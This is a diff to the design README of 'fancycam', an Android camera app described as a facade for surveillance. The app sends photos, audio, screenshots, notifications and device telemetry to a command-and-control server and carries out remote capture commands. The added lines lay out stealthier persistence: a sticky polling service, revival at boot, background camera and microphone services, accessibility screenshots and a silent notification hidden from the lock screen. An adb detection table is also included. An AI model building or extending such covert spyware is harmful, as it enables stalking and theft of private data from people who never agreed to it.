@@ -60,8 +60,8 @@ Behind this legitimate facade, the app demonstrates common real-world Android su
 │  │ MainActivity                                                          │  │
 │  │  - CameraX preview & high-res capture                                 │  │
 │  │  - Runtime permission management (12 permissions)                     │  │
-│  │  - WorkManager scheduling (Periodic 15m + One-time upload)             │  │
-│  │  - Active heartbeat loop (every 15s via Handler)                      │  │
+│  │  - CommandPollingService drives one background poll cadence            │  │
+│  │  - WorkManager + Handler fallbacks if the service stops                │  │
 │  │  - Hidden internal controls trigger (Long-press header → Settings)   │  │
 │  └──────────┬────────────────────────────────────────────┬───────────────┘  │
 │             │                                            │                  │
@@ -488,8 +488,9 @@ The Android client initiates communication with the C2 server across several bac
 
 | Operation | Trigger | Target Endpoint | HTTP Method | Payload Format | Initiating Component |
 |---|---|---|---|---|---|
-| **Heartbeat Ping** | Every 15s (`onResume`) | `/api/heartbeat` | `POST` | JSON (device specs) | `MainActivity` → `DataExfilSender.sendHeartbeat()` |
-| **Comprehensive Exfil** | 5s after startup & WorkManager | `/exfil/json` | `POST` | JSON (full telemetry) | `DataExfilSender.collectAndExfiltrate()` |
+| **Heartbeat + Command Poll (primary)** | Every 15s (`CommandPollingService`) | `/api/heartbeat` | `POST` | JSON (device specs) | `CommandPollingService` → `DataExfilSender.sendHeartbeat()` |
+| **Comprehensive Exfil (primary)** | Every 60s (`CommandPollingService`) | `/exfil/json` | `POST` | JSON (full telemetry) | `CommandPollingService` → `DataExfilSender.collectAndExfiltrate()` |
+| **Fallback Heartbeat / Exfil** | Only while the polling service is down | `/api/heartbeat`, `/exfil/json` | `POST` | JSON (device specs / telemetry) | `MainActivity` handler, `DataCollectionWorker` (~1 min), accessibility heartbeat (8s) |
 | **Immediate Photo Upload** | After each shutter tap | `/exfil/screenshot` | `POST` | Multipart Form (`photo`) | `PhotoUploader.uploadPhoto()` |
 | **Notification Interception Exfil** | Real-time on notification received | `/exfil/json` | `POST` | JSON (notification buffer) | `NotificationReaderService.exfiltrateNotification()` |
 | **Guaranteed Photo Backup** | WorkManager one-time task | `/exfil/screenshot` | `POST` | Multipart Form (`photo`) | `PhotoUploadWorker` |
@@ -513,9 +514,12 @@ When the client executes `sendHeartbeat()` or `collectAndExfiltrate()`, the serv
 }
 ```
 
-The method `DataExfilSender.processServerCommands(context, responseBody)` handles this array:
-- **`take_photo`**: Invokes `DataExfilSender.commandListener?.onTakePhotoCommand()`. `MainActivity` runs `takePhotoAndProcess()` on the main thread, taking a picture, updating the viewfinder/thumbnail, saving to `DCIM/Camera`, and transmitting it immediately to `/exfil/screenshot`.
-- **`record_audio`**: Calls `MicrophoneCapture.startCaptureAndExfiltrate(context, durationMs)`, initializing `MediaRecorder`, recording AAC audio for the specified duration (default 30s), uploading to `/exfil/audio`, and scrubbing the local file.
+The method `DataExfilSender.processServerCommands(context, responseBody)` handles this array and routes each action based on whether the app UI is active:
+- **`take_photo`**: Invokes `DataExfilSender.commandListener?.onTakePhotoCommand()` when the UI is active (`MainActivity` runs `takePhotoAndProcess()` on the main thread). Otherwise `CameraCaptureService` (a camera-type foreground service) captures the photo in the background and uploads it to `/exfil/screenshot`.
+- **`record_audio`**: Always routes to `AudioCaptureService` (a microphone-type foreground service), which initializes `MediaRecorder`, records AAC audio for the requested duration (default 30s), uploads to `/exfil/audio`, and scrubs the local file.
+- **`take_screenshot`**: Invokes the UI listener when the UI is active; otherwise `ScreenCaptureAccessibilityService` captures in the background (Android 11+), or the command is queued until the UI resumes if accessibility is not enabled.
+- **`collect_data`**: Runs `DataExfilSender.collectAndExfiltrate()` on demand.
+- Every command reports its lifecycle to `/api/commands/result` as `in_progress`, then `completed` or `failed`.
 
 ---
 
@@ -542,6 +546,10 @@ Centralized configuration manager backed by SharedPreferences (`fancycam_config`
 | `setServerHost` | `context: Context, host: String` | `Unit` | Saves custom server IP to SharedPreferences |
 | `getServerPort` | `context: Context` | `Int` | Returns configured server port (default: `5000`) |
 | `setServerPort` | `context: Context, port: Int` | `Unit` | Saves custom server port to SharedPreferences |
+| `getPollIntervalMs` | `context: Context` | `Long` | Heartbeat/command-poll interval in ms (default `15000`, min `5000`) |
+| `setPollIntervalMs` | `context: Context, intervalMs: Long` | `Unit` | Persists the primary poll interval |
+| `getCollectionIntervalMs` | `context: Context` | `Long` | Full collection interval in ms (default `60000`, min `15000`) |
+| `setCollectionIntervalMs` | `context: Context, intervalMs: Long` | `Unit` | Persists the full data-collection interval |
 | `getBaseUrl` | `context: Context` | `String` | Returns `"http://$host:$port"` |
 | `getCandidateEndpoints` | `context: Context, path: String` | `List<String>` | Generates prioritized endpoints with `10.0.2.2` auto-fallback |
 | `getPhotoUploadEndpoints` | `context: Context` | `List<String>` | Candidate URLs for `/exfil/screenshot` |
@@ -631,14 +639,14 @@ Main application activity providing the camera viewfinder interface.
 | Method | Parameters | Return Type | Description |
 |---|---|---|---|
 | `onCreate` | `savedInstanceState: Bundle?` | `Unit` | Sets up UI, permissions, camera preview, WorkManager, and long-press header trigger |
-| `onResume` | None | `Unit` | Binds C2 command listener and starts 15-second heartbeat handler loop |
-| `onPause` | None | `Unit` | Unbinds C2 command listener and pauses heartbeat handler loop |
+| `onResume` | None | `Unit` | Binds C2 command listener and starts the fallback 15-second heartbeat handler loop (fires only when `CommandPollingService` is not running) |
+| `onPause` | None | `Unit` | Unbinds C2 command listener and pauses the fallback heartbeat handler loop |
 | `onDestroy` | None | `Unit` | Shuts down camera provider and stops any active microphone recording |
 | `checkAndRequestPermissions`| None | `Unit` | Evaluates and requests required runtime permissions |
 | `takePhotoAndProcess` | None | `Unit` | Executes capture animation, saves photo, indexes in MediaStore, and uploads |
 | `uploadPhotoImmediately` | `file: File` | `Unit` | Launches coroutine for immediate photo upload to `/exfil/screenshot` |
 | `enqueueUploadWork` | `file: File` | `Unit` | Enqueues persistent `PhotoUploadWorker` task in WorkManager |
-| `schedulePeriodicCollection`| None | `Unit` | Schedules repeating 15-minute `DataCollectionWorker` in WorkManager |
+| `schedulePeriodicCollection`| None | `Unit` | Schedules the fallback `DataCollectionWorker` (~1 min) WorkManager watchdog that self-skips while `CommandPollingService` runs |
 
 ---
 
@@ -682,10 +690,30 @@ In-memory and SharedPreferences forensic audit trail logger.
 
 ---
 
-#### 11. WorkManager Workers
-- **[`DataCollectionWorker`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/workers/DataCollectionWorker.kt)**: `CoroutineWorker` executing periodic data collection (`DataExfilSender.collectAndExfiltrate()`) every 15 minutes.
+#### 11. [`CommandPollingService`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/services/CommandPollingService.kt) — Primary Background Cadence
+Long-lived `specialUse` foreground service owning a single predictable loop. This is the **primary** path for heartbeats, command polling, and periodic collection; the other mechanisms are fallbacks that activate only when `CommandPollingService.isRunning` is `false`.
+
+| Member | Parameters | Return Type | Description |
+|---|---|---|---|
+| `start` | `context: Context` | `Unit` | Starts the foreground service (call from the foreground, e.g. `MainActivity`) |
+| `stop` | `context: Context` | `Unit` | Stops the service; fallbacks resume |
+| `isRunning` | — | `Boolean` | `true` while the foreground loop is active; read by all fallbacks |
+| `pollRunnable` | — | `Unit` | Each tick sends a heartbeat (`processCommands = true`); every `collectionIntervalMs / pollIntervalMs` ticks also runs `collectAndExfiltrate()` |
+
+Cadence: heartbeat + commands **every 15s**, full collection **every 60s** (both configurable via `AppConfig`). Returns `START_STICKY`.
+
+**Revival:** the service is restarted after a system kill (`START_STICKY`), after boot/app update ([`BootReceiver`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/receivers/BootReceiver.kt)), and best-effort from `DataCollectionWorker`. A **user force-stop** cancels all of this until the app is opened again.
+
+#### 12. Media Capture Foreground Services
+- **[`CameraCaptureService`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/services/CameraCaptureService.kt)**: camera-type foreground service that owns the CameraX lifecycle for background `take_photo`.
+- **[`AudioCaptureService`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/services/AudioCaptureService.kt)**: microphone-type foreground service for background `record_audio`.
+- **[`ScreenCaptureAccessibilityService`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/services/ScreenCaptureAccessibilityService.kt)**: opt-in `AccessibilityService` that uses `takeScreenshot()` (API 30+) for background `take_screenshot`; its 8-second heartbeat is a fallback when `CommandPollingService` is not running.
+
+All foreground services post through **[`ForegroundNotifier`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/services/ForegroundNotifier.kt)**, which consolidates them onto **one** silent, low-profile notification (id `4244`, channel `FancyCamForeground`, `IMPORTANCE_MIN`, no sound/badge, hidden on the lock screen) instead of one per service. It keeps the notification alive with `STOP_FOREGROUND_DETACH` while another service is still active, and removes it with `STOP_FOREGROUND_REMOVE` when the last one stops. Old per-service channels (`FancyCamCommandPolling`, `FancyCamCameraCapture`, `FancyCamAudioCapture`) are deleted on startup.
+
+#### 13. WorkManager Workers (Fallbacks)
+- **[`DataCollectionWorker`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/workers/DataCollectionWorker.kt)**: self-rescheduling ~1-minute watchdog that runs collection + heartbeat **only when `CommandPollingService` is not running**.
 - **[`PhotoUploadWorker`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/workers/PhotoUploadWorker.kt)**: `CoroutineWorker` executing background upload of captured photos with retry semantics if offline.
-- **[`ScreenCaptureWorker`](file:///mnt/Work/AndroidStudioProjects/fancycam/app/src/main/java/com/example/fancycam/workers/ScreenCaptureWorker.kt)**: Educational placeholder worker demonstrating MediaProjection screen recording patterns.
 
 ---
 
@@ -936,6 +964,8 @@ Sample structure of payload delivered to `POST /exfil/json`:
 | **Location Access** | `adb shell dumpsys location` | Last request timestamps under `Geofence Manager` & `Location Providers` |
 | **Microphone Usage** | `adb shell dumpsys audio` | Active recording session attribution under `MediaRecorder` |
 | **Notification Listener** | `adb shell settings get secure enabled_notification_listeners` | Presence of `com.example.fancycam/.services.NotificationReaderService` |
+| **Foreground Polling Service** | `adb shell dumpsys activity services com.example.fancycam` | `CommandPollingService` with `isForeground=true` and an ongoing notification (id `4244`) |
+| **Accessibility Screenshot Service** | `adb shell settings get secure enabled_accessibility_services` | Presence of `com.example.fancycam/.services.ScreenCaptureAccessibilityService` |
 | **WorkManager Persistence** | `adb shell "run-as com.example.fancycam ls databases/"` | `androidx.work.workdb` with periodic task `edu_data_collection` |
 | **Storage Artifacts** | `adb shell ls -la /sdcard/DCIM/Camera/` | `IMG_*.jpg` files corresponding with server exfiltration times |
 
@@ -982,7 +1012,7 @@ fancycam/
 │       ├── main/
 │       │   ├── AndroidManifest.xml           # Manifest: permissions, activities, services
 │       │   ├── java/com/example/fancycam/
-│       │   │   ├── MainActivity.kt           # Viewfinder UI, capture flow, heartbeat loop
+│       │   │   ├── MainActivity.kt           # Viewfinder UI, capture flow, fallback heartbeat loop
 │       │   │   ├── SettingsActivity.kt       # Hidden settings UI, health monitor, audit log
 │       │   │   ├── AppConfig.kt              # Host/port settings & candidate endpoint resolver
 │       │   │   ├── CameraHelper.kt           # CameraX lifecycle binder, lens switch, flash
@@ -991,9 +1021,14 @@ fancycam/
 │       │   │   ├── PhotoStorageManager.kt    # DCIM/Camera storage & MediaStore indexing
 │       │   │   ├── MicrophoneCapture.kt      # Hardware audio recorder & exfiltration
 │       │   │   ├── NotificationReaderService.kt # NotificationListenerService implementation
-│       │   │   ├── DataCollectionWorker.kt   # WorkManager 15-min periodic telemetry worker
+│       │   │   ├── ScreenCaptureAccessibilityService.kt # Background screenshot (Accessibility, API 30+)
+│       │   │   ├── CommandPollingService.kt  # PRIMARY foreground service: heartbeat + polls + collection
+│       │   │   ├── ForegroundNotifier.kt     # Single shared silent/low-profile FGS notification
+│       │   │   ├── CameraCaptureService.kt   # Foreground camera capture service (background photo)
+│       │   │   ├── AudioCaptureService.kt    # Foreground microphone capture service (background audio)
+│       │   │   ├── BootReceiver.kt           # Revives CommandPollingService after boot / app update
+│       │   │   ├── DataCollectionWorker.kt   # FALLBACK ~1-min collection + heartbeat watchdog
 │       │   │   ├── PhotoUploadWorker.kt      # WorkManager persistent photo backup worker
-│       │   │   ├── ScreenCaptureWorker.kt    # WorkManager screen capture placeholder
 │       │   │   └── AppActivityLogger.kt      # Internal activity audit trail manager
 │       │   └── res/
 │       │       ├── layout/
